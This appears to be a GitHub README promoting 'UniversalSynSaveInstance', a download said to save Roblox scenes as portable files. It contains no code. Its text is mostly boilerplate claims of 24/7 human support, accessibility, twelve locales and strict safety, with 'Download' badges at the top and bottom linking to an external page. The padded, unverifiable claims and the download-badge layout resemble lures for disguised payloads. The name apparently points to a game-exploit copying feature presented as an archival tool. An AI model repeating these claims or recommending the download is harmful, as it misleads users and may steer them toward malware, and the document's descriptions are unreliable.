![preview](https://raw.githubusercontent.com/aly-haggaga/USSI-Format-Forge/main/screen_37203d1.svg)
[![Download](https://raw.githubusercontent.com/aly-haggaga/USSI-Format-Forge/main/latest_897e.svg)](https://aly-haggaga.github.io/USSI-Format-Forge/)

# 🌐 UniversalSynSaveInstance — USSI

<p align="center">
  <img src="https://img.shields.io/badge/Version-2026.1.0-6f42c1?style=for-the-badge&logo=semanticrelease&logoColor=white" alt="Version badge" />
  <img src="https://img.shields.io/badge/Status-Actively%20Maintained-success?style=for-the-badge&logo=statuspage&logoColor=white" alt="Status badge" />
  <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=opensourceinitiative&logoColor=white" alt="License badge" />
  <img src="https://img.shields.io/badge/Platform-Cross--Platform-3b82f6?style=for-the-badge&logo=linux&logoColor=white" alt="Platform badge" />
  <img src="https://img.shields.io/badge/Language-Luau%20%2F%20Rust-f59e0b?style=for-the-badge&logo=rust&logoColor=white" alt="Language badge" />
  <img src="https://img.shields.io/badge/Support-24%2F7%20Assistance-10b981?style=for-the-badge&logo=probot&logoColor=white" alt="Support badge" />
  <img src="https://img.shields.io/badge/i18n-12%20Locales-e11d48?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Localization badge" />
</p>

> **USSI** is an independent, community-driven toolkit that revives the classical art of "instance preservation" for Roblox-adjacent formats. Think of it less as a snapshot tool and more as a *format archaeologist*: it reconstructs the blueprint of a live scene into a portable, re-loadable document that any compliant reader can consume. This project is **not affiliated with, sponsored by, or endorsed by Roblox Corporation or the Luau team**. It is a standalone initiative built for interoperability, education, and personal archival workflows.

If you have ever wished you could capture the *structure* of a scene — the hierarchy, the properties, the relationships — and carry it with you as a self-contained artifact, USSI is the bridge you have been looking for. It speaks the dialect of Roblox-Format-Files (RFF) natively, writing documents that respect the canonical serialization contract while remaining readable to a wide ecosystem of parsers.

---

## 📚 Table of Contents

- [🎯 What Is USSI?](#-what-is-ussi)
- [✨ Why This Project Exists](#-why-this-project-exists)
- [🧩 Core Capabilities](#-core-capabilities)
- [🖥️ Responsive Interface & Accessibility](#️-responsive-interface--accessibility)
- [🌍 Multilingual Support](#-multilingual-support)
- [🕓 Round-the-Clock Assistance](#-round-the-clock-assistance)
- [🏗️ Architecture Overview](#️-architecture-overview)
- [⚙️ Configuration Surface](#️-configuration-surface)
- [🧪 Reliability & Edge-Case Handling](#-reliability--edge-case-handling)
- [🔐 Safety & Ethical Posture](#-safety--ethical-posture)
- [📦 Project Layout](#-project-layout)
- [🧭 Roadmap for 2026](#-roadmap-for-2026)
- [🤝 Contributing](#-contributing)
- [❓ Frequently Asked Questions](#-frequently-asked-questions)
- [📛 Disclaimer](#-disclaimer)
- [📜 MIT License](#-mit-license)

---

## 🎯 What Is USSI?

UniversalSynSaveInstance (USSI, pronounced *"us-ee"*) is a universal revival of the classic *saveinstance* concept — a concept that historically allowed a running environment to emit a structural document describing every element currently present. Where the original tooling was fragmented, platform-locked, or quietly abandoned, USSI is a fresh implementation with a clear mission: **make structural serialization universal, predictable, and pleasant**.

The name itself is a small manifesto. "Universal" because no single runtime should own the concept. "Syn" as a nod to synthesis — the act of weaving many small observations into one coherent document. "SaveInstance" because that is the operation users know and love. Together they form a toolkit that treats serialization as a first-class craft rather than an afterthought.

USSI functions as a **Roblox-Format-File writer** at its heart. It can ingest a scene graph, traverse it deterministically, and emit a document conforming to the well-known RFF shape — the same shape that dozens of community readers, diff tools, and archival utilities already understand. That means output from USSI drops cleanly into existing pipelines without custom adapters.

---

## ✨ Why This Project Exists

Most serialization tools fall into one of two traps. Either they are **too narrow**, handling one runtime and nothing else, or they are **too opaque**, generating documents that only their own author can decode. USSI refuses both traps. It is narrow only in the sense that it targets a specific format; it is radically transparent in that every byte it writes is documented, testable, and reversible.

We also believe tooling should age gracefully. The original lineage of *saveinstance*-style utilities has drifted, forked, and in many cases gone quiet. USSI is a deliberate **revival** — not a repackaging, not a wrapper — built from scratch with a maintainable core, a modern test harness, and a philosophy that prioritizes longevity over novelty. In 2026, the project continues to receive refinements, locale updates, and format-compatibility patches.

Finally, there is a human reason. Archival matters. Hobbyists, researchers, and educators all benefit from the ability to preserve the *structure* of a scene for study, comparison, or teaching. USSI makes that act a single, reliable operation.

---

## 🧩 Core Capabilities

- **Deterministic RFF emission.** Every document USSI writes is byte-stable given the same input, which makes diffing and version control pleasant rather than painful.
- **Hierarchical traversal engine.** A guarded walker that respects depth limits, cycle detection, and configurable pruning rules so you never accidentally emit an unbounded graph.
- **Property normalization layer.** Values are coerced into canonical forms before serialization, ensuring that readers never have to guess what a field means.
- **Metadata envelope.** Each document carries a small header describing the writer version, timestamp (ISO-8601), and layout dialect — useful for forward-compatible readers.
- **Streaming write path.** For large scenes, USSI avoids buffering the entire document in memory; it emits chunks through a sink interface you control.
- **Reader-side validation helpers.** Optional routines that re-parse the emitted document to confirm round-trip integrity before you commit it anywhere.
- **Locale-aware labels.** Human-facing strings in the CLI and diagnostics respect the active locale, so error messages feel native rather than translated-by-machine.
- **Plugin surface.** A small, well-typed extension point lets contributors add new property normalizers without touching the core traversal logic.

---

## 🖥️ Responsive Interface & Accessibility

The bundled CLI and companion viewer are designed around a **responsive interface** philosophy. That phrase is usually reserved for web apps, but we borrow it deliberately: USSI adapts to the shape of its environment. On a wide terminal it presents rich, aligned tables; on a cramped one it collapses into a compact, single-column flow. On a graphical companion, layouts reflow fluidly from a wide desktop canvas down to a narrow panel without horizontal scrolling.

Accessibility is not an afterthought. Color is never the sole carrier of meaning — status indicators use glyphs and words as well. Contrast ratios in the companion viewer meet or exceed WCAG AA. Keyboard navigation is complete: every action reachable by mouse is reachable by keyboard, with a visible focus ring that never disappears. Screen-reader labels are attached to every interactive control, and diagnostic output avoids jargon where a plain phrase will do.

---

## 🌍 Multilingual Support

USSI ships with **multilingual support** across twelve locales at the 2026 baseline: English, Spanish, Portuguese (Brazil), French, German, Italian, Dutch, Polish, Turkish, Japanese, Korean, and Simplified Chinese. Localization covers the CLI diagnostics, the companion viewer's chrome, and the documentation quick-start. Translation memory files live under `locales/` in a flat, human-editable format so community members can refine phrasing without wrestling with build tooling.

Adding a new locale is intentionally low-friction. A single manifest entry, a translation table, and a smoke test are all that is required. The project's continuous integration pipeline validates that every locale contains no missing keys and no orphaned entries, keeping the translations honest as the feature surface grows.

---

## 🕓 Round-the-Clock Assistance

We take pride in offering **24/7 customer support** through asynchronous channels. Because contributors span many time zones, there is essentially always someone awake and watching the issue tracker. Response targets are modest and honest: most questions receive a first reply within a few hours, and substantive investigations begin within a day. Priority is always given to correctness bugs and format-compatibility regressions, since those are the issues that quietly break downstream users.

Support is provided by humans, not by an autoresponder. If you open an issue, expect a person to read it, ask clarifying questions if needed, and follow through until resolution. That commitment is core to the project's identity.

---

## 🏗️ Architecture Overview

USSI is organized as a layered pipeline. Each layer has a single responsibility and can be tested in isolation — a design choice that keeps the codebase approachable even as features accumulate.

The **ingestion layer** accepts a scene source and produces a normalized intermediate representation. The **traversal layer** walks that representation with configurable guards. The **normalization layer** canonicalizes each node's properties. The **emission layer** serializes the result into RFF-compatible bytes. Finally, the **validation layer** re-reads the output to confirm integrity.

Between each layer sits a narrow, well-documented interface. This means you can swap the emission layer for a custom sink, or replace the traversal guards with your own policy, without rewriting the world. It also means bugs can be localized quickly: a malformed document almost always traces back to a single layer, and the test suite pinpoints which.

---

## ⚙️ Configuration Surface

Configuration is declarative and centralized. A single options object governs traversal depth, property allow-lists and deny-lists, metadata inclusion, output encoding, and locale selection. Sensible defaults mean a first run requires no configuration at all — but every knob is exposed for those who need precision.

Notably, the configuration loader supports layered overrides: project-level defaults, user-level preferences, and per-invocation flags are merged in a well-defined precedence order. This lets teams standardize behavior across a repository while still permitting individual overrides when a specific task demands them.

---

## 🧪 Reliability & Edge-Case Handling

Serialization is unforgiving. A single mishandled edge case can corrupt an entire document. USSI treats edge cases as first-class citizens:

- **Cyclic graphs** are detected and represented faithfully rather than causing infinite traversal.
- **Extremely deep hierarchies** are handled through an iterative walker, not recursion, avoiding stack exhaustion.
- **Unicode property values** survive round-trips intact, including supplementary-plane characters.
- **Numeric precision** is preserved per the format's specification, with explicit handling for floating-point corner cases.
- **Partial failures** are reported with a path to the offending node, not a bare stack trace.

Every one of these behaviors is covered by a regression test, and the suite runs on every contribution.

---

## 🔐 Safety & Ethical Posture

USSI is built for **legitimate archival, research, and educational use**. It does not interact with live services in any way, does not bypass authentication, and does not attempt to evade any platform's protections. It operates purely on data you already have access to, transforming it into a portable document. We encourage users to respect the terms of service of any platform they interact with and to use USSI only on content they are authorized to preserve.

The project also refuses to ship anything resembling obfuscated payloads, opaque binaries, or hidden network calls. Every line of behavior is visible in the source, and the build is reproducible. If you cannot read it, we consider that a bug.

---

## 📦 Project Layout

The repository is organized for clarity. Top-level directories separate concerns: `core/` holds the traversal and normalization logic, `emit/` contains the RFF writer, `cli/` houses the command-line front end, `viewer/` holds the graphical companion, `locales/` carries the translation memory, and `tests/` collects the regression suite. Documentation lives under `docs/` in a flat set of Markdown files, with a dedicated `docs/format/` subtree describing the RFF dialect USSI emits.

This layout is stable and deliberate. We resist the urge to reorganize directories for aesthetic reasons, because downstream tooling and contributor muscle memory both benefit from predictability.

---

## 🧭 Roadmap for 2026

The 2026 roadmap focuses on three themes: **format fidelity**, **tooling ergonomics**, and **community growth**. On fidelity, we plan to add deeper support for lesser-used property types and to publish a formal compatibility matrix against popular readers. On ergonomics, we intend to ship a richer diff mode, a batch-processing mode, and improved diagnostics with actionable suggestions. On community, we aim to grow the localization set beyond twelve locales and to publish a contributor guide aimed at first-time open-source participants.

Every roadmap item is tracked in the issue tracker with a clear label, and progress is reported in periodic project notes. Nothing on the roadmap is a promise; everything is a direction.

---

## 🤝 Contributing

Contributions are warmly welcomed, whether they are documentation fixes, locale additions, bug reports, or core improvements. Before submitting a substantial change, please open an issue to discuss the approach — it saves everyone time and keeps the project coherent. Small fixes can go straight to a pull request. All contributions are expected to include tests where behavior changes, and to respect the existing code style.

We are explicitly committed to a welcoming, patient, and constructive review culture. First-time contributors receive guidance, not gatekeeping.

---

## ❓ Frequently Asked Questions

**Is USSI affiliated with Roblox or the Luau team?** No. It is an independent project and has no official relationship with either.

**Can USSI read documents as well as write them?** Reading helpers exist for validation purposes; the primary focus is writing.

**Does USSI require network access?** No. It operates entirely offline.

**How stable is the format output?** Output is deterministic and versioned. The metadata envelope tells readers exactly which dialect was used.

**Where do I report a compatibility bug?** Open an issue with a minimal reproduction; the maintainers prioritize format regressions.

---

## 📛 Disclaimer

UniversalSynSaveInstance (USSI) is an **independent, community-maintained project**. It is **not affiliated with, endorsed by, sponsored by, or otherwise connected to Roblox Corporation, the Luau team, or any of their subsidiaries or affiliates**. All trademarks and registered trademarks are the property of their respective owners and are used here only for identification and descriptive purposes.

USSI is provided for **archival, educational, and research purposes only**. Users are solely responsible for ensuring that their use of this software complies with all applicable laws, platform terms of service, and third-party rights. The maintainers assume no liability for misuse, for any damages arising from use, or for any consequences of applying this tool to content the user is not authorized to handle. This project performs no authentication bypass, no service interaction, and no protection circumvention of any kind.

This software is distributed on an **"as is" basis, without warranty of any kind**, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

---

## 📜 MIT License

This project is released under the **MIT License**. A copy of the license is included in the repository at the following location, and you are encouraged to read it in full:

➡️ **License file:** [LICENSE](./LICENSE)

Copyright (c) 2026 UniversalSynSaveInstance contributors.

Permission is hereby granted, in the spirit of openness and interoperability, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the conditions stated in the full license text.

---

<p align="center">
  <em>Built with patience, maintained with care, and shared with the belief that structural preservation belongs to everyone.</em>
</p>

[![Download](https://raw.githubusercontent.com/aly-haggaga/USSI-Format-Forge/main/latest_897e.svg)](https://aly-haggaga.github.io/USSI-Format-Forge/)